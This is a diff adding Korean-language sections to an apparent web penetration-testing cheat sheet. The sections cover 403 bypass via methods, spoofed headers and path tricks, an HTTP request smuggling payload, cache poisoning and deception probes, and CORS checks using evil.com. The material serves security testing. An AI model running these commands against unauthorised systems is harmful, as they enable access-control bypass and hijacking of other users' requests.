@@ -101,3 +101,90 @@ nmap --script=http-methods --script-args http-methods.url-path='/' -p 80 TARGET
 nmap --script=http-shellshock --script-args uri=/cgi-bin/test.cgi -p 80 TARGET
 nmap --script=http-vuln-* -p 80,443 TARGET
 ```
+
+---
+
+## HTTP 메서드 / 경로 우회
+
+401/403 응답이 실제 ACL 불일치인지 확인.
+
+```bash
+# 메서드 스위치
+curl -X POST http://TARGET/admin
+curl -X PUT  http://TARGET/admin
+curl -X TRACE http://TARGET/admin
+
+# header 기반 IP/내부 경로 스푸핑
+for h in 'X-Forwarded-For' 'X-Real-IP' 'X-Originating-IP' 'X-Remote-IP' 'X-Client-IP' 'Forwarded'; do
+  curl -s -o /dev/null -w "%{http_code} $h\n" -H "$h: 127.0.0.1" http://TARGET/admin
+done
+
+# 경로 우회 트릭
+curl -i http://TARGET//admin
+curl -i http://TARGET/./admin
+curl -i http://TARGET/admin..;/
+curl -i http://TARGET/admin%20
+curl -i http://TARGET/admin%09
+curl -i http://TARGET/admin#
+curl -i http://TARGET/admin?
+
+# 자동화
+ffuf -u http://TARGET/admin -H "X-Forwarded-For: FUZZ" -w ips.txt -fc 403
+# 전용 도구
+nuclei -t http/misconfiguration/ -u http://TARGET
+```
+
+---
+
+## HTTP Request Smuggling
+
+프론트엔드(CDN/Proxy) 와 백엔드가 `Content-Length` / `Transfer-Encoding` 을 다르게 해석하는 경우.
+
+```bash
+# 자동 탐지
+smuggler.py -u https://TARGET
+
+# Burp 확장: HTTP Request Smuggler (Turbo Intruder 기반)
+# 테스트 유형: CL.TE / TE.CL / TE.TE
+```
+
+```http
+POST / HTTP/1.1
+Host: target
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+영향: 인증 우회, 다른 사용자 요청 탈취, 내부 경로 접근.
+
+---
+
+## Web Cache Poisoning / Deception
+
+```bash
+# Param Miner (Burp 확장) 로 캐시에 영향 미치는 숨은 header/parameter 탐지
+# 대표 예: X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL
+
+curl -s -H "X-Forwarded-Host: evil.com" "http://TARGET/?cb=$RANDOM" | grep -oE 'https?://[^"]+'
+# 다른 사용자 요청이 poisoned 응답을 받게 됨
+
+# Cache Deception: 정적 파일 경로에 인증 리소스 끼워넣기
+curl -i "http://TARGET/profile/me.css"
+curl -i "http://TARGET/api/v1/user/me/avatar.jpg"
+```
+
+---
+
+## CORS / header misconfig 빠른 점검
+
+```bash
+curl -sI -H "Origin: https://evil.com" http://TARGET/api/me | grep -iE 'access-control|set-cookie'
+# Access-Control-Allow-Origin: https://evil.com + Allow-Credentials: true → 취약
+
+nuclei -t http/cors/ -u http://TARGET
+nuclei -t http/misconfiguration/ -u http://TARGET
+```
